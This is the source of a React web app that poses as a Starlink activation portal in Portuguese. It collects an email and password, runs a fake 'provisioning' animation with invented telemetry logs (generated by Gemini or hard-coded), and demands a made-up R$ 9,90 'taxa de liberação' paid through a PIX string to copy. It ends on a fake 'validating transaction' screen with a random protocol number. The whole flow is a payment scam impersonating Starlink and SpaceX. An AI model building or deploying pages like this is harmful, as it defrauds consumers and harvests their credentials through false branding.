
import React, { useState, useCallback } from 'react';
import { 
  ShieldCheck, 
  Satellite, 
  AlertTriangle, 
  Loader2, 
  Lock, 
  Mail, 
  ArrowRight, 
  ArrowLeft, 
  UserPlus, 
  LogIn, 
  CreditCard, 
  CheckCircle2, 
  Clock, 
  Copy, 
  Check, 
  Zap, 
  Cpu, 
  Terminal
} from 'lucide-react';
import { StarlinkLogo } from './components/StarlinkLogo';
import { StatusLogger } from './components/StatusLogger';
import { GoogleGenAI } from "@google/genai";

enum AppState {
  LANDING = 'LANDING',
  SIGNUP = 'SIGNUP',
  LOGIN = 'LOGIN',
  POST_LOGIN_CHOICE = 'POST_LOGIN_CHOICE',
  PROVISIONING = 'PROVISIONING',
  PAYMENT_PENDING = 'PAYMENT_PENDING',
  PIX_PAYMENT = 'PIX_PAYMENT',
  SUCCESS_VALIDATION = 'SUCCESS_VALIDATION'
}

const App: React.FC = () => {
  const [currentState, setCurrentState] = useState<AppState>(AppState.LANDING);
  const [progress, setProgress] = useState(0);
  const [telemetry, setTelemetry] = useState<string[]>([]);
  const [accountData, setAccountData] = useState({ email: '', password: '' });
  const [copied, setCopied] = useState(false);

  const ai = new GoogleGenAI({ apiKey: process.env.API_KEY });

  const fetchTelemetryLogs = useCallback(async () => {
    try {
      const response = await ai.models.generateContent({
        model: 'gemini-3-flash-preview',
        contents: "Generate 10 technical-sounding one-line logs for a 'Starlink Satellite Connection Handshake' in Portuguese. Return only the lines.",
      });
      const lines = response.text?.split('\n').filter(l => l.trim() !== '') || [];
      return lines;
    } catch (error) {
      return [
        "Sincronizando matriz de fase orbital...",
        "Autenticando gateway terrestre...",
        "Otimizando latência de feixe...",
        "Criptografando túnel fim-a-fim...",
        "Validando assinatura digital Starlink...",
        "Provisionando credenciais de acesso..."
      ];
    }
  }, [ai.models]);

  const startProvisioning = async (targetState: AppState) => {
    setCurrentState(AppState.PROVISIONING);
    setProgress(0);
    setTelemetry([]);
    const logs = await fetchTelemetryLogs();
    
    let currentLogIndex = 0;
    const interval = setInterval(() => {
      setProgress(prev => {
        if (prev >= 100) {
          clearInterval(interval);
          setTimeout(() => setCurrentState(targetState), 800);
          return 100;
        }
        if (prev % 12 === 0 && currentLogIndex < logs.length) {
          setTelemetry(t => [...t, logs[currentLogIndex]]);
          currentLogIndex++;
        }
        return prev + 1;
      });
    }, 40);
  };

  const handleInitialFormSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (currentState === AppState.SIGNUP) {
      startProvisioning(AppState.PAYMENT_PENDING);
    } else {
      setCurrentState(AppState.POST_LOGIN_CHOICE);
    }
  };

  const handleCopyPix = () => {
    /** 
     * Payload PIX fornecido pelo usuário
     */
    const pixPayload = `00020126330014br.gov.bcb.pix01115349563386352040000530398654049.905802BR5909RECEBEDOR6006CIDADE62070503***6304AB80`;
    
    navigator.clipboard.writeText(pixPayload);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const goBack = () => {
    if (currentState === AppState.SUCCESS_VALIDATION || currentState === AppState.PIX_PAYMENT) {
      setCurrentState(AppState.POST_LOGIN_CHOICE);
    } else if (currentState === AppState.POST_LOGIN_CHOICE || currentState === AppState.SIGNUP || currentState === AppState.LOGIN || currentState === AppState.PAYMENT_PENDING) {
      setCurrentState(AppState.LANDING);
    }
  };

  const showHeaderBackButton = [
    AppState.SIGNUP, 
    AppState.LOGIN, 
    AppState.POST_LOGIN_CHOICE, 
    AppState.PAYMENT_PENDING, 
    AppState.PIX_PAYMENT,
    AppState.SUCCESS_VALIDATION
  ].includes(currentState);

  return (
    <div className="min-h-screen flex flex-col items-center justify-center p-4 relative overflow-hidden bg-black selection:bg-orange-500/30">
      {/* Glow Effects */}
      <div className="absolute top-[-10%] right-[-10%] w-[500px] h-[500px] bg-blue-600/5 rounded-full blur-[120px] pointer-events-none"></div>
      <div className="absolute bottom-[-10%] left-[-10%] w-[400px] h-[400px] bg-orange-600/10 rounded-full blur-[100px] pointer-events-none"></div>

      <div className="z-10 w-full max-w-xl">
        <div className="flex items-center justify-center mb-8 md:mb-12 relative h-16">
          {showHeaderBackButton && (
            <button 
              onClick={goBack}
              className="absolute left-0 p-3 text-gray-500 hover:text-white transition-all bg-white/5 rounded-full border border-white/10 hover:bg-white/15 active:scale-90"
              aria-label="Voltar"
            >
              <ArrowLeft className="w-5 h-5" />
            </button>
          )}
          <StarlinkLogo className="w-56 md:w-72 h-auto text-white" />
        </div>

        {/* 1. LANDING */}
        {currentState === AppState.LANDING && (
          <div className="bg-white/[0.03] backdrop-blur-2xl border border-white/10 rounded-[2.5rem] p-8 md:p-10 text-center shadow-2xl animate-in fade-in zoom-in duration-700">
            <div className="mb-6 inline-flex p-4 bg-white/5 rounded-2xl border border-white/5">
              <Satellite className="w-10 h-10 text-white animate-pulse" />
            </div>
            <h1 className="text-2xl md:text-3xl font-bold mb-4 tracking-tight text-white uppercase">Portal de Ativação</h1>
            <p className="text-gray-400 mb-10 max-w-sm mx-auto leading-relaxed text-sm">
              Conecte-se à maior constelação de satélites do mundo. Inicie seu provisionamento abaixo.
            </p>
            
            <div className="grid grid-cols-1 gap-4">
              <button
                onClick={() => setCurrentState(AppState.SIGNUP)}
                className="w-full py-4 px-8 bg-white text-black font-bold rounded-2xl hover:bg-gray-200 transition-all active:scale-95 flex items-center justify-center gap-3 group"
              >
                <UserPlus className="w-5 h-5" />
                <span className="tracking-tight">CRIAR NOVA CONTA</span>
                <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
              </button>
              
              <button
                onClick={() => setCurrentState(AppState.LOGIN)}
                className="w-full py-4 px-8 bg-white/5 text-white border border-white/10 font-bold rounded-2xl hover:bg-white/10 transition-all active:scale-95 flex items-center justify-center gap-3"
              >
                <LogIn className="w-5 h-5" />
                <span className="tracking-tight">JÁ TENHO UMA CONTA</span>
              </button>
            </div>
          </div>
        )}

        {/* 2. FORMS (SIGNUP / LOGIN) */}
        {(currentState === AppState.SIGNUP || currentState === AppState.LOGIN) && (
          <div className="bg-white/[0.03] backdrop-blur-2xl border border-white/10 rounded-[2.5rem] p-8 md:p-10 shadow-2xl animate-in fade-in slide-in-from-bottom-8 duration-500">
            <h2 className="text-2xl font-bold mb-2 text-white uppercase tracking-tight">
              {currentState === AppState.SIGNUP ? 'Novo Acesso' : 'Acessar Conta'}
            </h2>
            <p className="text-gray-400 text-sm mb-10">
              Insira suas credenciais para vincular ao terminal Starlink.
            </p>

            <form onSubmit={handleInitialFormSubmit} className="space-y-6">
              <div className="space-y-2">
                <label className="text-[10px] font-black text-gray-500 uppercase tracking-[0.2em] flex items-center gap-2">
                  <Mail className="w-3 h-3" /> E-MAIL CADASTRADO
                </label>
                <input 
                  type="email" 
                  required
                  placeholder="usuario@email.com"
                  className="w-full bg-white/5 border border-white/10 rounded-xl px-4 py-4 text-white focus:outline-none focus:border-white/30 transition-all placeholder:text-gray-700 text-sm"
                  value={accountData.email}
                  onChange={(e) => setAccountData({...accountData, email: e.target.value})}
                />
              </div>

              <div className="space-y-2">
                <label className="text-[10px] font-black text-gray-500 uppercase tracking-[0.2em] flex items-center gap-2">
                  <Lock className="w-3 h-3" /> SENHA DE ACESSO
                </label>
                <input 
                  type="password" 
                  required
                  placeholder="••••••••"
                  className="w-full bg-white/5 border border-white/10 rounded-xl px-4 py-4 text-white focus:outline-none focus:border-white/30 transition-all placeholder:text-gray-700 text-sm"
                  value={accountData.password}
                  onChange={(e) => setAccountData({...accountData, password: e.target.value})}
                />
              </div>

              <button
                type="submit"
                className="w-full py-4 bg-white text-black font-bold rounded-2xl hover:bg-gray-200 transition-all active:scale-95 flex items-center justify-center gap-3"
              >
                <span className="tracking-tight uppercase">{currentState === AppState.SIGNUP ? 'Provisionar' : 'Entrar e Validar'}</span>
                <ArrowRight className="w-5 h-5" />
              </button>
            </form>
          </div>
        )}

        {/* 3. POST-LOGIN CHOICE */}
        {currentState === AppState.POST_LOGIN_CHOICE && (
          <div className="bg-white/[0.03] backdrop-blur-2xl border border-white/10 rounded-[2.5rem] p-8 md:p-10 text-center shadow-2xl animate-in fade-in slide-in-from-bottom-8 duration-500">
             <div className="mb-6 inline-flex p-4 bg-orange-500/10 rounded-2xl border border-orange-500/20">
              <ShieldCheck className="w-10 h-10 text-orange-500" />
            </div>
            <h2 className="text-2xl font-bold mb-4 text-white uppercase tracking-tight">Status de Ativação</h2>
            <p className="text-gray-400 mb-10 text-sm leading-relaxed max-w-xs mx-auto">
              Identificamos sua conta. Para prosseguir, confirme o status da sua taxa de liberação.
            </p>
            
            <div className="grid grid-cols-1 gap-4">
              <button
                onClick={() => startProvisioning(AppState.SUCCESS_VALIDATION)}
                className="w-full py-4 px-4 bg-white/5 text-white border border-white/10 font-bold rounded-xl hover:bg-white/10 transition-all active:scale-95 flex items-center justify-center gap-3 group"
              >
                <CheckCircle2 className="w-5 h-5 text-orange-400 shrink-0" />
                <span className="text-[10px] sm:text-xs md:text-sm uppercase tracking-wider md:tracking-widest">JÁ PAGUEI A TAXA</span>
              </button>
              
              <button
                onClick={() => startProvisioning(AppState.PAYMENT_PENDING)}
                className="w-full py-4 px-4 bg-orange-500 text-black font-black rounded-xl hover:bg-orange-400 transition-all active:scale-95 flex items-center justify-center gap-3 group shadow-[0_0_20px_rgba(249,115,22,0.3)]"
              >
                <AlertTriangle className="w-5 h-5 shrink-0" />
                <span className="text-[10px] sm:text-xs md:text-sm uppercase tracking-wider md:tracking-widest">NÃO PAGUEI A TAXA</span>
              </button>
            </div>
          </div>
        )}

        {/* 4. PROVISIONING */}
        {currentState === AppState.PROVISIONING && (
          <div className="bg-white/[0.03] backdrop-blur-2xl border border-white/10 rounded-[2.5rem] p-8 md:p-10 shadow-2xl animate-in fade-in zoom-in duration-500">
            <div className="flex items-center justify-between mb-8">
              <div className="flex items-center gap-3">
                <Loader2 className="w-6 h-6 text-orange-500 animate-spin" />
                <span className="text-sm font-bold tracking-[0.2em] text-white uppercase">Sincronizando</span>
              </div>
              <span className="text-xl font-mono font-bold text-orange-500">{progress}%</span>
            </div>

            <div className="w-full bg-white/5 h-1.5 rounded-full overflow-hidden mb-8">
              <div 
                className="h-full bg-orange-500 transition-all duration-300 ease-out shadow-[0_0_15px_rgba(249,115,22,0.5)]"
                style={{ width: `${progress}%` }}
              ></div>
            </div>

            <StatusLogger logs={telemetry} />
          </div>
        )}

        {/* 5. PAYMENT PENDING */}
        {currentState === AppState.PAYMENT_PENDING && (
          <div className="bg-white/[0.03] backdrop-blur-2xl border border-orange-500/20 rounded-[2.5rem] p-8 md:p-10 shadow-2xl animate-in fade-in zoom-in duration-700">
            <div className="flex flex-col items-center py-6 text-center">
              <div className="w-20 h-20 bg-orange-500/10 rounded-full flex items-center justify-center mb-8 border border-orange-500/30 relative">
                <div className="absolute inset-0 bg-orange-500/10 blur-2xl rounded-full animate-pulse"></div>
                <AlertTriangle className="w-10 h-10 text-orange-500 relative z-10" />
              </div>
              
              <h2 className="text-2xl font-black mb-4 tracking-tight text-white uppercase">Taxa de Liberação Pendente</h2>
              <p className="text-gray-400 text-sm max-w-sm leading-relaxed mb-10">
                O provisionamento orbital foi concluído, porém seu terminal aguarda o pagamento da <strong>Taxa de Liberação de Sinal de R$ 9,90</strong> para iniciar o tráfego de dados.
              </p>

              <button
                onClick={() => setCurrentState(AppState.PIX_PAYMENT)}
                className="w-full py-4 px-4 bg-orange-500 text-black font-black rounded-2xl hover:bg-orange-400 transition-all active:scale-95 flex items-center justify-center gap-3 shadow-[0_0_30px_rgba(249,115,22,0.3)] group"
              >
                <CreditCard className="w-5 h-5 shrink-0" />
                <span className="text-[11px] sm:text-sm md:text-base uppercase tracking-wider sm:tracking-widest">EFETUAR PAGAMENTO</span>
                <ArrowRight className="w-5 h-5 shrink-0 group-hover:translate-x-1 transition-transform" />
              </button>
              
              <p className="mt-8 text-[9px] text-gray-600 uppercase tracking-[0.3em] font-black">
                SpaceX Billing Protocol v3.4
              </p>
            </div>
          </div>
        )}

        {/* 6. PIX PAYMENT SCREEN (CLEAN NOIR TECH) */}
        {currentState === AppState.PIX_PAYMENT && (
          <div className="bg-white/[0.02] backdrop-blur-3xl border border-white/20 rounded-[2.5rem] p-8 md:p-12 shadow-2xl animate-in fade-in zoom-in duration-700 text-center relative overflow-hidden">
            {/* HUD Elements */}
            <div className="absolute top-0 right-0 p-4 opacity-5 pointer-events-none">
              <Terminal className="w-32 h-32" />
            </div>
            
            <div className="flex items-center justify-center gap-3 mb-2">
              <Zap className="w-4 h-4 text-white animate-pulse" />
              <span className="text-[10px] font-black tracking-[0.4em] text-white/30 uppercase italic">Uplink Gateway V4</span>
            </div>
            <h2 className="text-3xl font-black mb-2 tracking-tighter text-white uppercase italic">Taxa de Liberação</h2>
            <div className="flex items-center justify-center gap-4 mb-10">
              <div className="h-[1px] w-12 bg-white/20"></div>
              <span className="text-white font-mono text-3xl font-black tracking-tighter">R$ 9,90</span>
              <div className="h-[1px] w-12 bg-white/20"></div>
            </div>
            
            {/* DECORATIVE SATELLITE (WITH HIDDEN CLICK TO PROGRESS) */}
            <div 
              onClick={() => startProvisioning(AppState.SUCCESS_VALIDATION)}
              className="relative inline-block mb-12 p-8 bg-white/5 rounded-full border border-white/10 group cursor-pointer"
            >
              <div className="absolute inset-0 bg-white/5 blur-3xl rounded-full opacity-20"></div>
              
              <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
                <div className="w-full h-full rounded-full border border-white/20 animate-[ping_3s_infinite]"></div>
                <div className="absolute w-[80%] h-[80%] rounded-full border border-white/10 animate-[ping_4s_infinite]"></div>
              </div>

              <div className="relative z-10">
                <Satellite className="w-20 h-20 text-white mb-2" />
                <div className="flex justify-center gap-1.5 mt-2">
                  <div className="w-1.5 h-1.5 rounded-full bg-white animate-[bounce_1s_infinite]"></div>
                  <div className="w-1.5 h-1.5 rounded-full bg-white animate-[bounce_1s_infinite_200ms]"></div>
                  <div className="w-1.5 h-1.5 rounded-full bg-white animate-[bounce_1s_infinite_400ms]"></div>
                </div>
              </div>
            </div>

            <div className="space-y-6 max-w-sm mx-auto">
              <div className="text-left space-y-4">
                <div className="flex flex-col items-center gap-2">
                  {/* CENTRAL COPY BUTTON - COPIES SPECIFIC PAYLOAD PROVIDED BY USER */}
                  <button 
                    onClick={handleCopyPix}
                    className="w-full py-5 bg-white text-black font-black rounded-xl hover:bg-gray-200 transition-all active:scale-95 flex items-center justify-center gap-3 shadow-[0_0_30px_rgba(255,255,255,0.1)] group"
                  >
                    {copied ? (
                      <>
                        <Check className="w-5 h-5 animate-in zoom-in" />
                        <span className="tracking-[0.2em] uppercase text-xs font-black">CHAVE COPIADA</span>
                      </>
                    ) : (
                      <>
                        <Copy className="w-5 h-5 group-hover:scale-110 transition-transform" />
                        <span className="tracking-[0.2em] uppercase text-xs font-black">COPIAR CHAVE PIX</span>
                      </>
                    )}
                  </button>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* 7. SUCCESS VALIDATION */}
        {currentState === AppState.SUCCESS_VALIDATION && (
          <div className="bg-white/[0.03] backdrop-blur-2xl border border-orange-500/30 rounded-[2.5rem] p-8 md:p-10 shadow-2xl animate-in fade-in zoom-in duration-700">
            <div className="flex flex-col items-center py-4 text-center">
              <div className="w-20 h-20 bg-orange-500/20 rounded-full flex items-center justify-center mb-8 border border-orange-500/40">
                <Clock className="w-10 h-10 text-orange-500 animate-pulse" />
              </div>
              
              <h2 className="text-2xl font-black mb-4 tracking-tight text-white uppercase">Validando Transação</h2>
              <p className="text-gray-400 text-sm max-w-sm leading-relaxed">
                Estamos processando sua solicitação junto ao sistema financeiro da Starlink para a taxa de R$ 9,90. O sinal será restabelecido automaticamente em até 5 horas após a confirmação do pagamento no sistema.
              </p>
              
              <div className="mt-10 w-full p-4 bg-orange-500/5 rounded-2xl border border-orange-500/10 text-[10px] text-orange-400/70 uppercase tracking-widest font-bold">
                Protocolo: {Math.random().toString(36).substr(2, 9).toUpperCase()}
              </div>
            </div>
          </div>
        )}
      </div>

      <div className="absolute bottom-8 text-center w-full px-4 pointer-events-none">
        <p className="text-[9px] text-gray-700 uppercase tracking-[0.4em] font-black">
          SATELLITE NETWORK TERMINAL • SECURE CONNECTION
        </p>
      </div>

      <style>{`
        @keyframes scan {
          0% { top: 0; opacity: 0; }
          10% { opacity: 1; }
          90% { opacity: 1; }
          100% { top: 100%; opacity: 0; }
        }
      `}</style>
    </div>
  );
};

export default App;
